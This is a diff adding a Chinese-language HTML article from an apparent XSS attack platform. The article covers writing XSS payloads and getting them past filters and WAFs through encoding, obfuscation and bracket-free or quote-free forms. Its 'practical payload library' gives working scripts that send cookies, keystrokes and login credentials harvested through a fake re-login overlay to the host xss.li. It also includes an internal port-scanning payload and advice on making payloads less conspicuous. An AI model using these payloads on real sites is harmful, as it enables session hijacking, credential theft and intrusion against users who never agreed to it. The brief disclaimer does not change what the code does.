@@ -1,0 +1,508 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- Favicon -->
+    <link rel="icon" type="image/png" href="../tu/xssicon.png">
+    <link rel="shortcut icon" type="image/png" href="../tu/xssicon.png">
+    <link rel="apple-touch-icon" href="../tu/xssicon.png">
+    
+    <meta name="description" content="XSS Payload编写技巧完整教程，包括混淆绕过、WAF绕过、编码技巧、无script标签Payload、短Payload等高级攻击技术。">
+    <meta name="keywords" content="XSS Payload,混淆绕过,WAF绕过,XSS编码,编码绕过,短Payload,无脚本标签,XSS技巧">
+    <meta name="author" content="蓝莲花XSS平台">
+    <meta property="og:title" content="XSS Payload编写技巧与混淆绕过 - XSS安全知识库">
+    <meta property="og:description" content="掌握高级XSS Payload编写技巧，包含混淆、编码、WAF绕过等实战方法">
+    <meta property="og:type" content="article">
+    <title>XSS Payload编写技巧与混淆绕过 - XSS安全知识库</title>
+    <link href="../static/libs/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="../static/libs/fontawesome/css/all.min.css">
+    <link rel="stylesheet" href="../static/css/style.css">
+    <link rel="stylesheet" href="../static/libs/prism/css/prism-tomorrow.min.css">
+    
+    <style>
+        .article-header {
+            background: linear-gradient(135deg, var(--bg-secondary) 0%, var(--bg-tertiary) 100%);
+            padding: 3rem 0;
+            margin-bottom: 2rem;
+            border-bottom: 2px solid var(--neon-green);
+        }
+        
+        .article-title {
+            font-size: 2.5rem;
+            color: var(--text-highlight);
+            margin-bottom: 1rem;
+            text-shadow: 0 0 10px rgba(0, 255, 65, 0.3);
+        }
+        
+        .article-meta {
+            color: var(--text-secondary);
+            font-size: 0.95rem;
+        }
+        
+        .article-content {
+            max-width: 900px;
+            margin: 0 auto;
+            padding: 2rem;
+            background: rgba(0, 0, 0, 0.3);
+            border-radius: var(--border-radius);
+            line-height: 1.8;
+        }
+        
+        .article-content h2 {
+            color: var(--neon-green);
+            margin-top: 2.5rem;
+            margin-bottom: 1.5rem;
+            padding-bottom: 0.5rem;
+            border-bottom: 2px solid rgba(0, 255, 65, 0.3);
+        }
+        
+        .article-content h3 {
+            color: var(--text-highlight);
+            margin-top: 2rem;
+            margin-bottom: 1rem;
+        }
+        
+        .article-content p {
+            margin-bottom: 1.2rem;
+            color: var(--text-secondary);
+        }
+        
+        .article-content code {
+            background: rgba(0, 255, 65, 0.1);
+            padding: 0.2rem 0.5rem;
+            border-radius: 3px;
+            color: var(--neon-green);
+            font-family: var(--font-family);
+        }
+        
+        .article-content pre {
+            background: rgba(0, 0, 0, 0.5);
+            padding: 1.5rem;
+            border-radius: var(--border-radius);
+            border-left: 3px solid var(--neon-green);
+            overflow-x: auto;
+            margin: 1.5rem 0;
+        }
+        
+        .warning-box {
+            background: rgba(255, 193, 7, 0.1);
+            border-left: 4px solid #ffc107;
+            padding: 1rem;
+            margin: 1.5rem 0;
+            border-radius: 4px;
+        }
+        
+        .info-box {
+            background: rgba(0, 123, 255, 0.1);
+            border-left: 4px solid #007bff;
+            padding: 1rem;
+            margin: 1.5rem 0;
+            border-radius: 4px;
+        }
+        
+        .success-box {
+            background: rgba(40, 167, 69, 0.1);
+            border-left: 4px solid #28a745;
+            padding: 1rem;
+            margin: 1.5rem 0;
+            border-radius: 4px;
+        }
+        
+        .breadcrumb {
+            background: transparent;
+            padding: 1rem 0;
+        }
+        
+        .breadcrumb-item a {
+            color: var(--neon-green);
+            text-decoration: none;
+        }
+        
+        .breadcrumb-item.active {
+            color: var(--text-secondary);
+        }
+        
+        .nav-article {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 3rem;
+            padding-top: 2rem;
+            border-top: 1px solid var(--border-color);
+        }
+        
+        .nav-article a {
+            color: var(--neon-green);
+            text-decoration: none;
+            transition: all 0.3s ease;
+        }
+        
+        .nav-article a:hover {
+            color: var(--text-highlight);
+            transform: translateX(5px);
+        }        
+        /* 鍥炲埌椤堕儴鎸夐挳 */
+        .back-to-top {
+            position: fixed;
+            bottom: 40px;
+            right: 40px;
+            width: 50px;
+            height: 50px;
+            background: var(--neon-green);
+            color: #000;
+            border: none;
+            border-radius: 50%;
+            font-size: 1.5rem;
+            cursor: pointer;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 4px 15px rgba(0, 255, 65, 0.3);
+        }
+        
+        .back-to-top:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 6px 20px rgba(0, 255, 65, 0.5);
+        }
+        
+        .back-to-top.show {
+            opacity: 1;
+            visibility: visible;
+        }
+    </style>
+</head>
+<body>
+    <!-- Breadcrumb -->
+    <div class="container">
+        <nav aria-label="breadcrumb">
+            <ol class="breadcrumb">
+                <li class="breadcrumb-item"><a href="../index.html">首页</a></li>
+                <li class="breadcrumb-item"><a href="../wiki.html">知识库</a></li>
+                <li class="breadcrumb-item active">XSS Payload编写技巧</li>
+            </ol>
+        </nav>
+    </div>
+
+    <!-- Article Header -->
+    <div class="article-header">
+        <div class="container text-center">
+            <h1 class="article-title">
+                <i class="fas fa-code"></i> XSS Payload编写技巧与混淆绕过
+            </h1>
+            <div class="article-meta">
+                <span> 2025年12月</span>
+                <span class="mx-3">|</span>
+                <span><i class="far fa-clock"></i> 25分钟阅读</span>
+                <span class="mx-3">|</span>
+                <span><i class="fas fa-tag"></i> 攻击技术</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Article Content -->
+    <div class="container">
+        <div class="article-content">
+            <h2><i class="fas fa-lightbulb"></i> 一、Payload基础概念</h2>
+            
+            <p>XSS Payload是指用于执行跨站脚本攻击的恶意JavaScript代码。一个优秀的Payload应该具备以下特点：</p>
+            
+            <ul>
+                <li><strong>隐蔽性</strong>：不易被用户发现</li>
+                <li><strong>高效性</strong>：快速完成攻击目标</li>
+                <li><strong>兼容性</strong>：在不同浏览器上都能运行</li>
+                <li><strong>绕过性</strong>：能够绕过WAF和XSS过滤器</li>
+            </ul>
+
+            <h3>1.1 基础Payload结构</h3>
+            
+            <p>最简单的XSS Payload:</p>
+            <pre><code class="language-javascript">&lt;script&gt;alert('XSS')&lt;/script&gt;</code></pre>
+            
+            <p>使用事件处理器:</p>
+            <pre><code class="language-javascript">&lt;img src=x onerror=alert('XSS')&gt;</code></pre>
+
+            <h2><i class="fas fa-shield-alt"></i> 二、常见过滤器绕过技巧</h2>
+            
+            <h3>2.1 大小写混淆</h3>
+            <p>许多过滤器区分大小写，可以通过大小写混淆来绕过：</p>
+            <pre><code class="language-javascript">&lt;ScRiPt&gt;alert('XSS')&lt;/sCrIpT&gt;
+&lt;IMG SRC=x OnErRoR=alert('XSS')&gt;</code></pre>
+
+            <h3>2.2 双写绕过</h3>
+            <p>如果过滤器只删除一次关键字，可以使用双写：</p>
+            <pre><code class="language-javascript">&lt;scr&lt;script&gt;ipt&gt;alert('XSS')&lt;/scr&lt;/script&gt;ipt&gt;
+&lt;img srsrc=x onerronerror=alert('XSS')&gt;</code></pre>
+
+            <h3>2.3 编码绕过</h3>
+            
+            <p><strong>HTML实体编码：</strong></p>
+            <pre><code class="language-javascript">&lt;img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;"&gt;</code></pre>
+            
+            <p><strong>Unicode编码：</strong></p>
+            <pre><code class="language-javascript">&lt;script&gt;\u0061\u006c\u0065\u0072\u0074('XSS')&lt;/script&gt;</code></pre>
+            
+            <p><strong>Base64编码：</strong></p>
+            <pre><code class="language-javascript">&lt;iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="&gt;</code></pre>
+
+            <h3>2.4 注释混淆</h3>
+            <p>在关键字中插入注释：</p>
+            <pre><code class="language-javascript">&lt;scr/*comment*/ipt&gt;alert('XSS')&lt;/scr/**/ipt&gt;
+&lt;img src=x one/**/rror=alert('XSS')&gt;</code></pre>
+
+            <h3>2.5 换行符绕过</h3>
+            <pre><code class="language-javascript">&lt;img src=x 
+onerror
+=
+alert('XSS')&gt;</code></pre>
+
+            <h2><i class="fas fa-magic"></i> 三、高级Payload技巧</h2>
+            
+            <h3>3.1 无<code>&lt;script&gt;</code>标签的Payload</h3>
+            
+            <p>当<code>&lt;script&gt;</code>标签被过滤时，可以使用事件处理器：</p>
+            <pre><code class="language-javascript">// SVG标签
+&lt;svg onload=alert('XSS')&gt;
+&lt;svg&gt;&lt;animate onbegin=alert('XSS')&gt;
+
+// Body标签
+&lt;body onload=alert('XSS')&gt;
+&lt;body onpageshow=alert('XSS')&gt;
+
+// Input标签
+&lt;input onfocus=alert('XSS') autofocus&gt;
+&lt;input onblur=alert('XSS') autofocus&gt;&lt;input autofocus&gt;
+
+// Marquee标签
+&lt;marquee onstart=alert('XSS')&gt;
+
+// Details标签
+&lt;details open ontoggle=alert('XSS')&gt;</code></pre>
+
+            <h3>3.2 无括号的Payload</h3>
+            <p>当括号被过滤时：</p>
+            <pre><code class="language-javascript">&lt;script&gt;alert`XSS`&lt;/script&gt;
+&lt;script&gt;onerror=alert;throw 'XSS'&lt;/script&gt;
+&lt;script&gt;{onerror=alert}throw 'XSS'&lt;/script&gt;</code></pre>
+
+            <h3>3.3 无引号的Payload</h3>
+            <p>使用String.fromCharCode或其他方法：</p>
+            <pre><code class="language-javascript">&lt;script&gt;alert(String.fromCharCode(88,83,83))&lt;/script&gt;
+&lt;img src=x onerror=alert(/XSS/)&gt;
+&lt;img src=x onerror=eval(/alert\x28'XSS'\x29/.source)&gt;</code></pre>
+
+            <h3>3.4 短Payload</h3>
+            <p>当长度受限时，使用最短的Payload：</p>
+            <pre><code class="language-javascript">&lt;script src=//Ǌ&gt;&lt;/script&gt;  // 最短的外部JS载入
+&lt;svg onload=alert(1)&gt;  // 常用短Payload
+&lt;marquee onstart=alert(1)&gt;  // 18字符</code></pre>
+
+            <h2><i class="fas fa-puzzle-piece"></i> 四、WAF绕过实战案例</h2>
+            
+            <h3>4.1 绕过空格过滤</h3>
+            <pre><code class="language-javascript">// 使用Tab、换行等空白字符
+&lt;img	src=x	onerror=alert('XSS')&gt;
+&lt;img%0asrc=x%0aonerror=alert('XSS')&gt;
+
+// 使用斜杠
+&lt;img/src=x/onerror=alert('XSS')&gt;</code></pre>
+
+            <h3>4.2 绕过等号过滤</h3>
+            <pre><code class="language-javascript">&lt;svg&gt;&lt;animate attributeName%3dx onbegin%3dalert(1)&gt;</code></pre>
+
+            <h3>4.3 绕过关键字检测</h3>
+            <p>使用字符串拼接或其他技巧：</p>
+            <pre><code class="language-javascript">&lt;script&gt;eval('ale'+'rt(1)')&lt;/script&gt;
+&lt;script&gt;eval(atob('YWxlcnQoMSk='))&lt;/script&gt;
+&lt;script&gt;Function('ale'+'rt(1)')()&lt;/script&gt;
+&lt;script&gt;[]['constructor']['constructor']('alert(1)')()&lt;/script&gt;</code></pre>
+
+            <h3>4.4 多重编码</h3>
+            <pre><code class="language-javascript">// URL编码 + HTML编码
+&lt;img src=x onerror="&#x25;&#x36;&#x31;&#x25;&#x36;&#x63;&#x25;&#x36;&#x35;&#x25;&#x37;&#x32;&#x25;&#x37;&#x34;(1)"&gt;</code></pre>
+
+            <h2><i class="fas fa-database"></i> 五、实战Payload库</h2>
+            
+            <h3>5.1 Cookie窃取Payload</h3>
+            <pre><code class="language-javascript">// 基础版本
+&lt;script&gt;
+document.location='http://xss.li/collect?c='+document.cookie;
+&lt;/script&gt;
+
+// 使用Image对象（更隐蔽）
+&lt;script&gt;
+new Image().src='http://xss.li/collect?c='+document.cookie;
+&lt;/script&gt;
+
+// 使用fetch API
+&lt;script&gt;
+fetch('http://xss.li/collect', {
+    method: 'POST',
+    body: JSON.stringify({cookie: document.cookie})
+});
+&lt;/script&gt;</code></pre>
+
+            <h3>5.2 键盘记录Payload</h3>
+            <pre><code class="language-javascript">&lt;script&gt;
+var keys = '';
+document.onkeypress = function(e) {
+    keys += e.key;
+    if(keys.length > 20) {
+        new Image().src='http://xss.li/collect?k='+encodeURIComponent(keys);
+        keys = '';
+    }
+}
+&lt;/script&gt;</code></pre>
+
+            <h3>5.3 钓鱼Payload</h3>
+            <pre><code class="language-javascript">&lt;script&gt;
+var overlay = document.createElement('div');
+overlay.innerHTML = `
+    &lt;div style="position:fixed;top:0;left:0;width:100%;height:100%;
+                background:rgba(0,0,0,0.8);z-index:9999"&gt;
+        &lt;div style="margin:100px auto;width:400px;background:white;
+                    padding:20px;border-radius:5px"&gt;
+            &lt;h3&gt;会话已过期，请重新登录&lt;/h3&gt;
+            &lt;input type="text" id="u" placeholder="用户名" style="width:100%"&gt;
+            &lt;input type="password" id="p" placeholder="密码" style="width:100%;margin:10px 0"&gt;
+            &lt;button onclick="steal()"&gt;登录&lt;/button&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;`;
+document.body.appendChild(overlay);
+
+function steal() {
+    var u = document.getElementById('u').value;
+    var p = document.getElementById('p').value;
+    new Image().src='http://xss.li/collect?u='+u+'&p='+p;
+    location.reload();
+}
+&lt;/script&gt;</code></pre>
+
+            <h3>5.4 端口扫描Payload</h3>
+            <pre><code class="language-javascript">&lt;script&gt;
+var ports = [21, 22, 23, 25, 80, 443, 3306, 3389, 8080];
+var results = [];
+
+ports.forEach(port =&gt; {
+    var img = new Image();
+    img.onerror = function() { 
+        results.push(port + ':open'); 
+    };
+    img.src = 'http://192.168.1.1:' + port;
+});
+
+setTimeout(() =&gt; {
+    new Image().src = 'http://xss.li/collect?ports=' + results.join(',');
+}, 5000);
+&lt;/script&gt;</code></pre>
+
+            <div class="warning-box">
+                <h4><i class="fas fa-exclamation-triangle"></i> 警告</h4>
+                <p>本文中的Payload仅用于安全研究和授权的渗透测试。未经授权对他人系统进行测试是违法行为！</p>
+            </div>
+
+            <h2><i class="fas fa-tools"></i> 六、Payload测试与优化</h2>
+            
+            <h3>6.1 Payload编码工具</h3>
+            <p>常用的编码工具：</p>
+            <ul>
+                <li>Burp Suite的Decoder</li>
+                <li>CyberChef（在线编码工具）</li>
+                <li>XSS Hunter（自动化XSS平台）</li>
+                <li>BeEF Framework（浏览器利用框架）</li>
+            </ul>
+
+            <h3>6.2 Payload优化建议</h3>
+            <ol>
+                <li><strong>测试兼容性</strong>：在不同浏览器中测试Payload</li>
+                <li><strong>缩短长度</strong>：在长度受限的场景下优化代码</li>
+                <li><strong>提高隐蔽性</strong>：避免使用明显的恶意代码</li>
+                <li><strong>增加稳定性</strong>：添加异常处理机制</li>
+            </ol>
+
+            <h3>6.3 Payload混淆示例</h3>
+            <p>原始Payload:</p>
+            <pre><code class="language-javascript">alert(document.cookie);</code></pre>
+            
+            <p>混淆后:</p>
+            <pre><code class="language-javascript">eval(String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41));</code></pre>
+
+            <div class="success-box">
+                <h4><i class="fas fa-check-circle"></i> 最佳实践</h4>
+                <p>1. 始终测试Payload的有效性<br>
+                2. 根据目标环境调整编码方式<br>
+                3. 使用自动化工具提高效率<br>
+                4. 保持对新绕过技术的学习</p>
+            </div>
+
+            <h2><i class="fas fa-book"></i> 七、总结</h2>
+            
+            <p>XSS Payload的编写是一门艺术，需要不断学习和实践。关键要点：</p>
+            
+            <ul>
+                <li>掌握基础的编码和混淆技术</li>
+                <li>了解常见WAF的过滤规则</li>
+                <li>熟悉各种绕过技巧</li>
+                <li>善用自动化工具</li>
+                <li>保持合法合规的测试</li>
+            </ul>
+
+            <p>记住：技术是中性的，关键在于如何使用。请将这些知识用于提升系统的安全性！</p>
+
+            <!-- Navigation -->
+            <div class="nav-article">
+                <a href="xss-types.html">
+                    <i class="fas fa-arrow-left"></i> 上一篇：XSS三大类型详解
+                </a>
+                <a href="../wiki.html">
+                    返回知识库 <i class="fas fa-list"></i>
+                </a>
+                <a href="cookie-stealing.html">
+                    下一篇：Cookie窃取实战 <i class="fas fa-arrow-right"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="container-fluid">
+            <div class="footer-content">
+                <div class="footer-copyright">
+                    <span>© 2025 蓝莲花XSS在线平台</span>
+                </div>
+                <div class="footer-links">
+                    <a href="../index.html"><i class="fas fa-home"></i> 返回首页</a>
+                </div>
+            </div>
+        </div>
+    </footer>    
+    <!-- 鍥炲埌椤堕儴鎸夐挳 -->
+    <button class="back-to-top" id="backToTop">
+        <i class="fas fa-arrow-up"></i>
+    </button>
+    
+
+    <script src="../static/libs/bootstrap/js/bootstrap.bundle.min.js"></script>
+    <script src="../static/libs/prism/js/prism.min.js"></script>
+    <script src="../static/libs/prism/js/prism-javascript.min.js"></script>
+    <script src="../static/libs/prism/js/prism-markup.min.js"></script>    <script>
+        // 鍥炲埌椤堕儴鍔熻兘
+        const backToTopBtn = document.getElementById('backToTop');
+        window.addEventListener('scroll', function() {
+            if (window.pageYOffset > 300) {
+                backToTopBtn.classList.add('show');
+            } else {
+                backToTopBtn.classList.remove('show');
+            }
+        });
+        backToTopBtn.addEventListener('click', function() {
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        });
+    </script>
+</body>
+</html>
